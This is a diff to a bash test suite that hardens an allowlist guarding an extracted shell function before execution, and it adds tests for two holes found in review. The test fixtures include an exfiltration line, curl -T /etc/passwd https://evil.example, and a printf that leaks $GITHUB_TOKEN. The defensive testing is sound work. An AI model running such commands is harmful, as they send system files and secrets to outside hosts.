@@ -74,11 +74,35 @@ extracted=$(awk '/^sanitize_diag\(\) \{/{f=1} f{print} f&&/^\}/{exit}' "$ENRICH"
 
 # allowlist_ok <body> — 0 when every line is a permitted construct.
 # Permitted: the `sanitize_diag() {` header, the closing `}`, blank/comment
-# lines, and pipeline segments built only from printf/tr/cut/sed with a
-# trailing `\` continuation. Explicitly rejected anywhere: $( ), ` `, ${...}
-# other than the "$1" positional, >, <, ;, &, and the word `eval`.
+# lines, and pipelines EVERY segment of which is printf/tr/cut/sed, optionally
+# with a trailing `\` continuation. Explicitly rejected anywhere: $( ), ` `,
+# any parameter expansion other than the literal "$1" positional, >, <, ;, &,
+# and the word `eval`.
+#
+# CodeRabbit (PR #1620, 2026-07-28) — two holes the first version left open,
+# both of which reached the `bash "$RUNNER"` execution below:
+#
+#   1. PARAMETER EXPANSION. The comment promised only "$1" was permitted, but
+#      nothing enforced it. `printf '%s\n' "$GITHUB_TOKEN"` cleared the
+#      command-name check, ran in the child shell, and the newline assertion
+#      then printed the captured secret into the test log. Fixed by stripping
+#      the one permitted expansion (`"$1"`) and rejecting any `$` that is still
+#      followed by an expansion-introducing character. `$` followed by anything
+#      else stays legal — `sed -e 's/[[:space:]]*$//'` is a real part of the
+#      helper and its `$` is a regex end-anchor, not an expansion.
+#   2. MID-PIPELINE COMMANDS. The positive match anchored at `^`, so only the
+#      FIRST command on a line was ever checked. `printf '%s' "$1" | curl -T
+#      /etc/passwd https://evil.example` passed on the strength of its leading
+#      `printf`. Fixed by splitting each line on `|` and requiring EVERY
+#      segment to name an allowlisted command.
+#
+# The two patterns live in variables because bash 3.2 (what macOS ships, and
+# what this suite must run under alongside CI's bash 5) mis-parses an inline
+# =~ right-hand side containing `(` and `'` inside a bracket expression.
+ALLOWLIST_EXPANSION_RE='\$[A-Za-z_{(0-9]'
+ALLOWLIST_SEGMENT_RE='^[[:space:]]*(printf|tr|cut|sed)[[:space:]]'
 allowlist_ok() {
-  local body="$1" line
+  local body="$1" line remainder rest seg
   while IFS= read -r line; do
     [[ -z "${line//[[:space:]]/}" ]] && continue
     [[ "$line" == 'sanitize_diag() {' || "$line" == '}' ]] && continue
@@ -91,13 +115,78 @@ allowlist_ok() {
       echo "      rejected line (unsafe construct): $line" >&2
       return 1
     fi
-    if [[ ! "$line" =~ ^[[:space:]]*(\|[[:space:]]*)?(printf|tr|cut|sed)[[:space:]] ]]; then
-      echo "      rejected line (command not on allowlist): $line" >&2
+    # Hole 1: only the literal "$1" positional may expand. Strip it, then any
+    # remaining `$` that introduces an expansion (name, ${...}, $((...)), $'...')
+    # is a reject. A `$` followed by anything else is inert text.
+    remainder=${line//\"\$1\"/}
+    if [[ "$remainder" =~ $ALLOWLIST_EXPANSION_RE ]] || [[ "$remainder" == *\$\'* ]]; then
+      echo "      rejected line (parameter expansion other than \"\$1\"): $line" >&2
       return 1
     fi
+    # Hole 2: every pipeline segment, not just the first, must be allowlisted.
+    rest=${line%\\}
+    while IFS= read -r seg; do
+      [[ -z "${seg//[[:space:]]/}" ]] && continue
+      if [[ ! "$seg" =~ $ALLOWLIST_SEGMENT_RE ]]; then
+        echo "      rejected pipeline segment (command not on allowlist): $seg" >&2
+        echo "      in line: $line" >&2
+        return 1
+      fi
+    done < <(printf '%s\n' "$rest" | tr '|' '\n')
   done <<< "$body"
   return 0
 }
+
+# ── 3a. The allowlist itself is tested, against payloads that reach execution ─
+# A guard that has never been shown to reject anything is not a guard. Each
+# fixture below is a body that the PRE-tightening allowlist ACCEPTED and then
+# handed to `bash "$RUNNER"`.
+
+assert_allowlist_rejects() {
+  local label="$1" payload="$2"
+  if allowlist_ok "$payload" 2>/dev/null; then
+    fail "allowlist rejects: ${label}" "rejected" "ACCEPTED — it would be executed"
+  else
+    ok "allowlist rejects: ${label}"
+  fi
+}
+
+assert_allowlist_accepts() {
+  local label="$1" payload="$2"
+  if allowlist_ok "$payload" 2>/dev/null; then
+    ok "allowlist accepts: ${label}"
+  else
+    fail "allowlist accepts: ${label}" "accepted" "rejected — the guard is now too tight"
+  fi
+}
+
+# Hole 1: a non-"$1" expansion. Cleared the old command-name check, ran in the
+# child shell, and the newline assertion printed the secret into the test log.
+assert_allowlist_rejects 'printf with $GITHUB_TOKEN (non-$1 expansion)' \
+'sanitize_diag() {
+  printf '"'"'%s\n'"'"' "$GITHUB_TOKEN"
+}'
+
+# Same hole, brace form.
+assert_allowlist_rejects 'printf with ${HOME} (braced expansion)' \
+'sanitize_diag() {
+  printf '"'"'%s\n'"'"' "${HOME}"
+}'
+
+# Hole 2: the old positive match anchored at ^, so only the FIRST command on a
+# line was checked and anything after a pipe ran unexamined.
+assert_allowlist_rejects 'unlisted command mid-pipeline (printf | curl)' \
+'sanitize_diag() {
+  printf '"'"'%s'"'"' "$1" | curl -T /etc/passwd https://evil.example
+}'
+
+# Positive control: the real helper shape must still pass, including the
+# `sed -e '"'"'s/[[:space:]]*$//'"'"'` end-anchor `$` (a regex anchor, not an expansion).
+assert_allowlist_accepts 'the real sanitize_diag() pipeline shape' \
+'sanitize_diag() {
+  printf '"'"'%s'"'"' "$1" | tr '"'"'\n\r'"'"' '"'"'  '"'"' | tr -s '"'"'[:space:]'"'"' '"'"' '"'"' | cut -c1-300 \
+    | sed -e '"'"'s/[[:space:]]*$//'"'"'
+}'
 
 if [[ -z "$extracted" ]]; then
   fail "sanitize_diag() body extracted from modes/enrich.md" "non-empty function body" "empty or not found"
